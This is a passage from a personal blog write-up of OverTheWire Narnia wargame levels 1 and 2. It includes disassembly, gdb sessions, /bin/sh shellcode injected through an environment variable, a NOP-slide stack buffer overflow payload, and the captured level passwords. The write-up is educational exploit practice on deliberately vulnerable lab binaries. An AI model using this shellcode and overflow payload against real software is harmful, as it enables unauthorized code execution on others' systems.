+ <span class="m">80484</span><span class="n">a0</span><span class="o">:</span> <span class="m">83</span> <span class="n">c4</span> <span class="m">04</span>             <span class="n">add</span>    <span class="o">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 80484a3: 68 40 85 04 08       push   $0x8048540
+</span><span class="o"> 80484a8: e8 73 fe ff ff       call   8048320 &lt;getenv@plt&gt;
+</span><span class="o"> 80484ad: 83 c4 04             add    $0x4,%</span><span class="n">esp</span>
+ <span class="m">80484</span><span class="n">b0</span><span class="o">:</span> <span class="m">89</span> <span class="m">45</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="o">%eax,-0x4(%</span><span class="n">ebp</span><span class="p">)</span>
+ <span class="m">80484</span><span class="n">b3</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="m">-0</span><span class="nf">x4</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+ <span class="m">80484</span><span class="n">b6</span><span class="o">:</span> <span class="n">ff</span> <span class="n">d0</span>                <span class="n">call</span>   <span class="o">*%eax
+</span><span class="o"> 80484b8: b8 00 00 00 00       mov    $0x0,%</span><span class="n">eax</span>
+ <span class="m">80484</span><span class="n">bd</span><span class="o">:</span> <span class="n">c9</span>                   <span class="n">leave</span>  
+ <span class="m">80484</span><span class="n">be</span><span class="o">:</span> <span class="n">c3</span>                   <span class="n">ret</span>
+ <span class="m">80484</span><span class="n">bf</span><span class="o">:</span> <span class="m">90</span>                   <span class="n">nop</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looks like there&rsquo;s enough room for some local variable. Not sure entirely what it does or how it is used:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">804846</span><span class="n">e</span><span class="o">:</span> <span class="m">83</span> <span class="n">ec</span> <span class="m">04</span>             <span class="n">sub</span>    <span class="o">$</span><span class="mh">0x4</span><span class="p">,</span>%<span class="n">esp</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>These lines caught my eye:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">80484</span><span class="n">b0</span><span class="o">:</span> <span class="m">89</span> <span class="m">45</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="o">%eax,-0x4(%</span><span class="n">ebp</span><span class="p">)</span>
+ <span class="m">80484</span><span class="n">b3</span><span class="o">:</span> <span class="m">8</span><span class="n">b</span> <span class="m">45</span> <span class="n">fc</span>             <span class="n">mov</span>    <span class="m">-0</span><span class="nf">x4</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+ <span class="m">80484</span><span class="n">b6</span><span class="o">:</span> <span class="n">ff</span> <span class="n">d0</span>                <span class="n">call</span>   <span class="o">*</span>%<span class="n">eax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>It appears that whatever variable on the stack here is used as the address of our &ldquo;call&rdquo; instruction - this is likely just a locally defined function pointer. So, since it&rsquo;s just executing whatever the contents of <code>$EGG</code> are, we just need to pipe in some Shellcode. And then have the program execute it.</p>
+<p>Additionally, if we want to get real fancy we can try creating our own shellcode. A future post will walkthrough creating shell code that runs on overthewire (following guidance from <a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X" target="_blank" rel="noopener noreffer">The Shellcoders Handbook</a> - see the shellcode creation section).</p>
+<p>In the mean time here&rsquo;s the resulting shell code being passed into the program via the <code>$EGG</code> environment variable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia1@narnia:/narnia$ <span class="nv">EGG</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34;&#39;</span><span class="k">)</span> ./narnia1
+Trying to execute EGG!
+$ ls
+narnia0    narnia1    narnia2 narnia3    narnia4    narnia5   narnia6    narnia7 narnia8
+narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c narnia8.c
+$ whoami
+Narnia2
+</code></pre></td></tr></table>
+</div>
+</div><p>Which gives the password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">    $ cat /etc/narnia_pass/narnia2
+    nairiepecu
+</code></pre></td></tr></table>
+</div>
+</div><p>Additionally, there exists some great tools and resources that have some pre-generated shellcode for a variety of system: <a href="http://shell-storm.org/shellcode/.">http://shell-storm.org/shellcode/.</a> However, it is strongly advised to look over and understand what some shellcode does before actually using it.</p>
+<h2 id="narnia2">narnia2</h2>
+<p>How to log into Narnia:</p>
+<blockquote>
+<p>ssh -p 2226 <a href="mailto:narnia2@narnia.labs.overthewire.org">narnia2@narnia.labs.overthewire.org</a></p>
+</blockquote>
+<p>Password: <code>nairiepecu</code></p>
+<p>Where to find all of the challenges:</p>
+<blockquote>
+<p>cd /narnia/</p>
+</blockquote>
+<p>It should be no surprise at this point that first up is to run the app:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia2@narnia:/narnia$ ./narnia2
+Usage: ./narnia2 argument
+</code></pre></td></tr></table>
+</div>
+</div><p>Now let&rsquo;s try a simple input:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia2@narnia:/narnia$ ./narnia2 AAAA
+AAAAnarnia2@narnia:/narnia$
+</code></pre></td></tr></table>
+</div>
+</div><p>And find a breaking input:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia2@narnia:/narnia$ ./narnia2 <span class="k">$(</span>python -c <span class="s1">&#39;print &#34;A&#34;*20&#39;</span><span class="k">)</span>
+AAAAAAAAAAAAAAAAAAAA
+</code></pre></td></tr></table>
+</div>
+</div><p>No luck, time to try something a bit more extreme:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia2@narnia:/narnia$ ./narnia2 <span class="k">$(</span>python -c <span class="s1">&#39;print &#34;A&#34;*256&#39;</span><span class="k">)</span>
+Segmentation fault
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we&rsquo;re talking, a <a href="https://en.wikipedia.org/wiki/Segmentation_fault" target="_blank" rel="noopener noreffer">segfault</a> is usually a nightmare for me, however in this case it&rsquo;s exactly what I&rsquo;m looking for. Taking a look at the assembly:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="m">0804844</span><span class="n">b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span>
+ <span class="m">804844</span><span class="n">b</span><span class="o">:</span>       <span class="m">55</span>                      <span class="n">push</span>   <span class="o">%ebp
+</span><span class="o"> 804844c:       89 e5                   mov    %</span><span class="n">esp</span><span class="p">,</span><span class="o">%ebp
+</span><span class="o"> 804844e:       83 c4 80                add    $0xffffff80,%</span><span class="n">esp</span>
+ <span class="m">8048451</span><span class="o">:</span>       <span class="m">83</span> <span class="m">7</span><span class="n">d</span> <span class="m">08</span> <span class="m">01</span>             <span class="n">cmpl</span>   <span class="o">$</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%ebp)
+</span><span class="o"> 8048455:       75 1a                   jne    8048471 &lt;main+0x26&gt;
+</span><span class="o"> 8048457:       8b 45 0c                mov    0xc(%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%eax
+</span><span class="o"> 804845a:       8b 00                   mov    (%</span><span class="n">eax</span><span class="p">),</span><span class="o">%eax
+</span><span class="o"> 804845c:       50                      push   %</span><span class="n">eax</span>
+ <span class="m">804845</span><span class="n">d</span><span class="o">:</span>       <span class="m">68</span> <span class="m">20</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>          <span class="n">push</span>   <span class="o">$</span><span class="mh">0x8048520</span>
+ <span class="m">8048462</span><span class="o">:</span>       <span class="n">e8</span> <span class="m">99</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="m">8048300</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048467</span><span class="o">:</span>       <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>                <span class="n">add</span>    <span class="o">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 804846a:       6a 01                   push   $0x1
+</span><span class="o"> 804846c:       e8 af fe ff ff          call   8048320 &lt;exit@plt&gt;
+</span><span class="o"> 8048471:       8b 45 0c                mov    0xc(%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%eax
+</span><span class="o"> 8048474:       83 c0 04                add    $0x4,%</span><span class="n">eax</span>
+ <span class="m">8048477</span><span class="o">:</span>       <span class="m">8</span><span class="n">b</span> <span class="m">00</span>                   <span class="nf">mov    </span><span class="p">(</span><span class="o">%eax),%</span><span class="n">eax</span>
+ <span class="m">8048479</span><span class="o">:</span>       <span class="m">50</span>                      <span class="n">push</span>   <span class="o">%eax
+</span><span class="o"> 804847a:       8d 45 80                lea    -0x80(%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%eax
+</span><span class="o"> 804847d:       50                      push   %</span><span class="n">eax</span>
+ <span class="m">804847</span><span class="n">e</span><span class="o">:</span>       <span class="n">e8</span> <span class="m">8</span><span class="n">d</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="m">8048310</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048483</span><span class="o">:</span>       <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>                <span class="n">add</span>    <span class="o">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 8048486:       8d 45 80                lea    -0x80(%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%eax
+</span><span class="o"> 8048489:       50                      push   %</span><span class="n">eax</span>
+ <span class="m">804848</span><span class="n">a</span><span class="o">:</span>       <span class="m">68</span> <span class="m">34</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>          <span class="n">push</span>   <span class="o">$</span><span class="mh">0x8048534</span>
+ <span class="m">804848</span><span class="n">f</span><span class="o">:</span>       <span class="n">e8</span> <span class="m">6</span><span class="n">c</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="m">8048300</span> <span class="o">&lt;</span><span class="n">printf</span><span class="o">@</span><span class="n">plt</span><span class="o">&gt;</span>
+ <span class="m">8048494</span><span class="o">:</span>       <span class="m">83</span> <span class="n">c4</span> <span class="m">08</span>                <span class="n">add</span>    <span class="o">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%esp
+</span><span class="o"> 8048497:       b8 00 00 00 00          mov    $0x0,%</span><span class="n">eax</span>
+ <span class="m">804849</span><span class="n">c</span><span class="o">:</span>       <span class="n">c9</span>                      <span class="n">leave</span>  
+ <span class="m">804849</span><span class="n">d</span><span class="o">:</span>       <span class="n">c3</span>                      <span class="n">ret</span>
+ <span class="m">804849</span><span class="n">e</span><span class="o">:</span>       <span class="m">66</span> <span class="m">90</span>                   <span class="n">xchg</span>   <span class="o">%ax,%</span><span class="n">ax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And what happens if we run through gdb with bad input:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &#34;A&#34;*256&#39;</span><span class="p">)</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia2</span> <span class="o">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &#34;A&#34;*256&#39;</span><span class="p">)</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault.</span>
+<span class="mh">0x41414141</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>All right, this is interesting. Seems we can control return address(<code>ret</code>) by completely destroying the stack since we overflow the buffer, in other words a classic <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank" rel="noopener noreffer">stack buffer overflow</a> exploit.</p>
+<p>Looking a bit more into this, it looks like there&rsquo;s like a buffer of size <code>0x80</code> (128bytes):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"> <span class="m">804847</span><span class="n">a</span><span class="o">:</span>       <span class="m">8</span><span class="n">d</span> <span class="m">45</span> <span class="m">80</span>                <span class="n">lea</span>    <span class="m">-0</span><span class="nf">x80</span><span class="p">(</span><span class="o">%ebp),%</span><span class="n">eax</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Which means the python call should be able to work with some smaller value than 256.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia2</span> <span class="o">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &#34;A&#34;*136&#39;</span><span class="p">)</span>
+
+<span class="n">Breakpoint</span> <span class="m">1</span><span class="p">,</span> <span class="mh">0x0804844e</span> <span class="n">in</span> <span class="nf">main </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
+<span class="n">Continuing.</span>
+
+<span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault.</span>
+<span class="mh">0x41414141</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looks like 136 will do the trick, since the goal is to overflow past 128 bytes and continue writing over the Saved Frame Pointer (4 bytes) and the return address (another 4 bytes). There&rsquo;s almost enough pieces to be able to exploit the program. It should be possible to reuse the shellcode from <a href="#narnia1" rel="">narnia1</a>, and put that into our exploit payload, which in turn will be put into the buffer. Then we just need to get the address of the start of the shellcode into the <code>RET</code> which in turn will get loaded into <code>$EIP</code>, so when the function finishes executing it&rsquo;ll actually return the shellcode and execute it.</p>
+<p>The trick here is that knowing the exact address of our shellcode can be a bit of a pain. So to have some wiggle room, a <a href="https://en.wikipedia.org/wiki/NOP_slide" target="_blank" rel="noopener noreffer">nop slide</a> can be used. When the CPU encounters a nop slide, the <code>nops</code> don&rsquo;t have have any operation that need to be preformed so the CPU just keeps marching through them until it hits an instruction that it actually needs to do something with.</p>
+<p>Putting that all together:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">narnia2</span><span class="o">@</span><span class="n">narnia</span><span class="o">:~$</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia2</span> <span class="o">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &#34;\x90&#34;*83 + &#34;\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42&#34; + &#34;&lt;ADDRESS OF THE NOP SLIDE&gt;&#34;&#39;</span><span class="p">)</span>
+<span class="o">$</span> <span class="n">whoami</span>
+<span class="n">narnia3</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Getting the address of the nop slide can be done fairly easily by running the program through GDB and printing out the address at:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="o">$</span><span class="n">ebp</span><span class="m">-0</span><span class="n">x80</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This mostly works for two reasons, first, because overthewire has disabled many techniques that would normally make it quite a bit harder to reliably determine this address. Second, the nop slide means the address doesn&rsquo;t have to be exact, just somewhere within the slide.</p>
+<p>And the password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="o">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">narnia_pass</span><span class="o">/</span><span class="n">narnia3</span>
+<span class="n">vaequeezee</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>To recap what was covered in these challenges: first overflowing a buffer to write over a local variable, next using <code>shellcode</code> in an environment variable, and finally writing a simple stack buffer overflow exploit (the python one liner). It&rsquo;s been a bit of whirlwind and there&rsquo;s a lot of miscellaneous reading that wasn&rsquo;t covered here. With the vast majority of my time spent reading over the <a href="https://c9x.me/x86/html/" target="_blank" rel="noopener noreffer">x86 Instruction Set Reference</a> and starting to build up a mental model of what a handful of assembly instructions are actually accomplishing.</p>
+<p>Some additional reading that can&rsquo;t go with out mentioning:</p>
+<ul>
+<li><a href="https://inst.eecs.berkeley.edu//~cs161/fa08/papers/stack_smashing.pdf" target="_blank" rel="noopener noreffer">Smashing the Stack for Fun and Profit</a> - This is a classic from <a href="https://en.wikipedia.org/wiki/Phrack" target="_blank" rel="noopener noreffer">Phrack</a> magazine</li>
+<li><a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank" rel="noopener noreffer">Malloc Maleficarum</a> - Not only does this have an amazing name, it contains a lot of really interesting information from a simpler time.</li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-06-27</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://noopz.github.io/narnia_challenges_part1/" data-title="Narnia Challenges (part 1)" data-hashtags="OTW,narnia,wargames"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://noopz.github.io/narnia_challenges_part1/" data-hashtag="OTW"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/otw/">OTW</a>,&nbsp;<a href="/tags/narnia/">narnia</a>,&nbsp;<a href="/tags/wargames/">wargames</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/natas_challenges_part4/" class="prev" rel="prev" title="Natas Challenges (part 4)"><i class="fas fa-angle-left fa-fw"></i>Natas Challenges (part 4)</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span><br><span class="asdf">&nbsp;<a href="/privacy" target="">Privacy Policy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{},"cookieconsent":{"content":{"allow":"Allow cookies","deny":"Decline","dismiss":"Allow cookies","link":"Learn more","message":"This website uses cookies to ensure you get the best experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"revokable":false,"theme":"edgeless","type":"info"},"gtagConfig":{"anonymize_ip":true,"enable":true,"tracking_id":"UA-168052344-1"}};</script><script type="text/javascript" src="/js/theme.min.cb3f77989212bebcd498d8b441c555574e00a1a1250508a430cf215c9f45bef736e721d5005ef144b47b2cd3997c2175c03977c50086fe4016eab32a8fe118b6.js" integrity="sha512-yz93mJISvrzUmNi0QcVVV04AoaElBQikMM8hXJ9Fvvc25yHVAF7xRLR7LNOZfCF1wDl3xQCG/kAW6rMqj&#43;EYtg=="></script>
+</body>
+</html>
